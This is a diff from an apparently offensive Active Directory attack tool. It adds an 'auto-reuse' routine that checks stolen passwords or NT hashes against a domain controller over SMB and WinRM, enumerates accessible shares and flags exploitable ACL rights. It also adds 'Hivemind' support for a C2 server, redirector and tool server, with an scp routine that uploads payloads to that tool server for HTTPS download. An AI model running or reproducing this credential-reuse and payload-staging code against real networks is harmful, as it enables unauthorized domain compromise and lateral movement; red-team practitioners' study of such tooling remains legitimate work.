+    fake.password = new_pass or target.password
+    fake.hash     = new_hash or (target.hash if not new_pass else None)
+
+    results = []
+
+    # 1. quick SMB auth check
+    nxc = check_tool('netexec','nxc')
+    if nxc and target.dc:
+        auth = ['-u',new_user]
+        if new_pass:  auth += ['-p',new_pass]
+        elif new_hash: auth += ['-H',new_hash]
+        rc, out_lines = run_cmd_capture([nxc,'smb',target.dc]+auth, label=f'auth check {new_user}')
+        out_str = '\n'.join(out_lines)
+        if 'Pwn3d!' in out_str:
+            log(f'{RED}[auto-reuse] {GREEN}LOCAL ADMIN{RESET} on {WHITE}{target.dc}{RESET}','success')
+            results.append('local admin')
+            add_result('auto-reuse', f'{new_user} = LOCAL ADMIN on {target.dc}')
+        elif '[+]' in out_str:
+            log(f'{GREEN}[auto-reuse] Auth valid for {WHITE}{new_user}{RESET}','success')
+
+    # 2. check winrm
+    if nxc and target.dc:
+        auth = ['-u',new_user]
+        if new_pass:  auth += ['-p',new_pass]
+        elif new_hash: auth += ['-H',new_hash]
+        rc, out_lines = run_cmd_capture([nxc,'winrm',target.dc]+auth, label=f'winrm check {new_user}')
+        if any('Pwn3d!' in l or '[+]' in l for l in out_lines):
+            log(f'{GREEN}[auto-reuse] WinRM access for {WHITE}{new_user}{RESET}','success')
+            add_result('auto-reuse', f'{new_user} → WinRM on {target.dc}')
+
+    # 3. shares
+    if nxc and target.dc:
+        auth = ['-u',new_user]
+        if new_pass:  auth += ['-p',new_pass]
+        elif new_hash: auth += ['-H',new_hash]
+        rc, out_lines = run_cmd_capture([nxc,'smb',target.dc]+auth+['--shares'],
+                                        label=f'shares {new_user}')
+        readable = [l for l in out_lines if 'READ' in l or 'WRITE' in l]
+        if readable:
+            log(f'{GREEN}[auto-reuse] {len(readable)} share(s) accessible as {WHITE}{new_user}{RESET}','success')
+            add_result('auto-reuse', f'{new_user} → {len(readable)} shares')
+
+    # 4. quick aclscan if abuseACL available
+    t_acl = check_tool('abuseACL')
+    if t_acl and target.dc and target.domain:
+        auth_str = f'{target.domain}/{new_user}'
+        if new_pass:  auth_str += f':{new_pass}'
+        rc, out_lines = run_cmd_capture(
+            [t_acl, f'{auth_str}@{target.dc}'],
+            label=f'aclscan {new_user}')
+        DANGEROUS = {'GenericAll','WriteDacl','WriteOwner','ForceChangePassword',
+                     'AddMember','GetChangesAll'}
+        hits = [l for l in out_lines if any(d in l for d in DANGEROUS)]
+        if hits:
+            log(f'{RED}[auto-reuse] {len(hits)} exploitable ACE(s) for {WHITE}{new_user}{RESET}','success')
+            for h in hits[:5]: print(f'  {RED}→{RESET} {h}')
+            add_result('auto-reuse', f'{new_user} → {len(hits)} exploitable ACEs')
+
+    if results:
+        log(f'{GREEN}[auto-reuse] Summary: {", ".join(results)}{RESET}','success')
+    else:
+        log(f'{GREY}[auto-reuse] No immediate escalation paths for {new_user}{RESET}','info')
+
+
+def _load_hivemind_state():
+    """Load Hivemind rack config from ~/.segfault-ad/hivemind_state."""
+    state_file = os.path.expanduser('~/.segfault-ad/hivemind_state')
+    if not os.path.exists(state_file): return {}
+    try:
+        import configparser as _cp
+        cfg = _cp.ConfigParser()
+        cfg.read(state_file)
+        s = cfg['hivemind'] if 'hivemind' in cfg else {}
+        return {
+            'c2':          s.get('c2','').strip(),
+            'redirector':  s.get('redirector','').strip(),
+            'toolserver':  s.get('toolserver','').strip(),
+            'logger':      s.get('logger','').strip(),
+            'loot_dir':    s.get('loot_dir','/opt/hivemind/loot').strip(),
+            'tools_port':  s.get('tools_port','443').strip(),
+        }
+    except Exception:
+        return {}
+
+_HIVEMIND = _load_hivemind_state()
+
+def _hivemind_redirector():
+    """Return redirector IP if Hivemind is configured."""
+    return _HIVEMIND.get('redirector','')
+
+def _hivemind_toolserver():
+    """Return tool server IP if Hivemind is configured."""
+    return _HIVEMIND.get('toolserver','')
+
+def hivemind_status():
+    """Show Hivemind rack status inline."""
+    if not _HIVEMIND:
+        log(f'{ORANGE}Hivemind not configured — add ~/.segfault-ad/hivemind_state{RESET}','warn')
+        log(f'{GREY}Write hivemind_state with [hivemind] section containing c2, redirector, toolserver, logger IPs{RESET}','info')
+        return
+
+    hr()
+    log(f'{C0}{BOLD}hivemind rack status{RESET}','info')
+    print()
+
+    nodes = [
+        ('c2',         'C2 Server',   RED),
+        ('redirector', 'Redirector',  ORANGE),
+        ('toolserver', 'Tool Server', C0),
+        ('logger',     'Logger',      PURPLE),
+    ]
+
+    for key, label, col in nodes:
+        ip = _HIVEMIND.get(key,'')
+        if not ip:
+            print(f'  {RED}■{RESET} {col}{label:<14}{RESET}  {GREY}not configured{RESET}')
+            continue
+        # quick ping check
+        rc = subprocess.run(['ping','-c','1','-W','1',ip],
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode
+        dot = f'{GREEN}■{RESET}' if rc == 0 else f'{RED}■{RESET}'
+        status = f'{GREEN}up{RESET}' if rc == 0 else f'{RED}unreachable{RESET}'
+        print(f'  {dot} {col}{label:<14}{RESET}  {WHITE}{ip:<18}{RESET}  {status}')
+
+    print()
+    redir = _hivemind_redirector()
+    tools = _hivemind_toolserver()
+    if redir: log(f'Use redirector {WHITE}{redir}{RESET} as lhost for listeners','info')
+    if tools: log(f'Tool server: {C0}https://{tools}:{_HIVEMIND.get("tools_port","443")}/payloads/{RESET}','info')
+    hr()
+
+def hivemind_upload(local_path):
+    """Upload a file to the Hivemind tool server."""
+    ts = _hivemind_toolserver()
+    if not ts:
+        log('Hivemind tool server not configured','error'); return None
+    loot_dir  = _HIVEMIND.get('loot_dir', '/opt/hivemind/loot')
+    port      = _HIVEMIND.get('tools_port','443')
+    fname     = os.path.basename(local_path)
+    dest      = f'{loot_dir}/payloads/{fname}'
+    key       = os.path.expanduser('~/.ssh/id_ed25519')
+    log(f'Uploading {WHITE}{fname}{RESET} → tool server', 'info')
+    rc = subprocess.run(
+        ['scp','-i',key,'-o','StrictHostKeyChecking=no',
+         local_path, f'pi@{ts}:{dest}'],
+        capture_output=True)
+    if rc.returncode == 0:
+        url = f'https://{ts}:{port}/payloads/{fname}'
+        log(f'{GREEN}Uploaded → {WHITE}{url}{RESET}','success')
+        return url
+    else:
+        log(f'Upload failed: {rc.stderr.decode()[:100]}','error')
+        return None
 
 
 def _load_spawn_state():
@@ -12458,7 +15403,18 @@ def main():
     parser.add_argument('-H','--hash',     help='NT hash for PTH')
     parser.add_argument('--dc',            help='DC IP address')
     parser.add_argument('--dc-fqdn',       help='DC FQDN (e.g. dc01.domain.local)')
+    parser.add_argument('--workspace','-w',help='Load workspace on startup')
+    parser.add_argument('--yes','-y',      action='store_true', help='Auto-confirm all prompts (non-interactive)')
+    parser.add_argument('--quiet','-q',    action='store_true', help='Skip banner animation, minimal output')
+    parser.add_argument('--timeout',       type=int, default=300, help='Default subprocess timeout in seconds (default: 300)')
+    parser.add_argument('--run',           help='Run a module on startup (e.g. --run nmap)')
     args = parser.parse_args()
+
+    # apply global flags
+    global _CMD_TIMEOUT, _YES_MODE, _QUIET_MODE
+    _CMD_TIMEOUT = args.timeout
+    _YES_MODE    = args.yes
+    _QUIET_MODE  = args.quiet
 
     # load spawn.py state first (lowest priority — CLI args override)
     _load_spawn_state()
@@ -12470,7 +15426,21 @@ def main():
     if args.dc:       TARGET.dc       = args.dc
     if hasattr(args,'dc_fqdn') and args.dc_fqdn: TARGET.dc_fqdn = args.dc_fqdn
 
-    _startup_banner()  # initial state so right pane renders immediately
+    # load workspace if specified
+    if args.workspace:
+        _load_workspace(TARGET, args.workspace)
+
+    if not _QUIET_MODE:
+        _startup_banner()
+    else:
+        log(f'segfault-ad v{VERSION} // segfault.solutions','info')
+
+    # run a module on startup if specified
+    if args.run:
+        cmd = args.run.strip().lower()
+        if cmd in MODULES:
+            try: MODULES[cmd]().run(TARGET)
+            except Exception as e: log(f'Startup module error: {e}','error')
 
     repl()
 
